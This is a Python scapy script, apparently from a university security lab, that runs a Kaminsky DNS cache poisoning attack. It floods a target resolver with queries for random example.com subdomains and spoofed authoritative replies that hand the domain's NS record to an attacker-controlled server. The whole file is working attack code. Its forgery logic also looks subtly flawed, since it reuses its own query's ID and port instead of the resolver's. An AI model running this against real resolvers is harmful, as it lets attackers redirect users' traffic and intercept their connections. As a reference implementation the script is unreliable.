#!/usr/bin/env python3
from scapy.all import *
import random
import string
import time

target_dns = "10.10.27.2"
attacker_ip = "10.10.27.4"
fake_auth_ip = "199.43.135.53"

def random_subdomain():
    return ''.join(random.choices(string.ascii_lowercase, k=10))

def attack_once():
    subdomain = random_subdomain()
    query_name = f"{subdomain}.example.com"
    dns_id = random.randint(1, 65535)
    src_port = random.randint(30000, 60000)
    
    print(f"Attack: {query_name} (ID: {dns_id})")
    
    query_pkt = IP(dst=target_dns, src=attacker_ip)/UDP(sport=src_port, dport=53)/DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
    send(query_pkt, verbose=0)
    
    forged_pkt = IP(src=fake_auth_ip, dst=target_dns)/UDP(sport=53, dport=src_port)/DNS(
        id=dns_id, qr=1, aa=1, rd=0,
        qd=DNSQR(qname=query_name, qtype="A"),
        an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
        ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
        ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata="10.10.27.4")
    )
    send(forged_pkt, verbose=0)

def main():
    print("Starting Kaminsky attack...")
    count = 0
    
    while count < 100:
        for i in range(20):
            attack_once()
            time.sleep(0.01)
        
        count += 1
        print(f"Batch {count} completed")
        time.sleep(0.5)

if __name__ == "__main__":
    main()
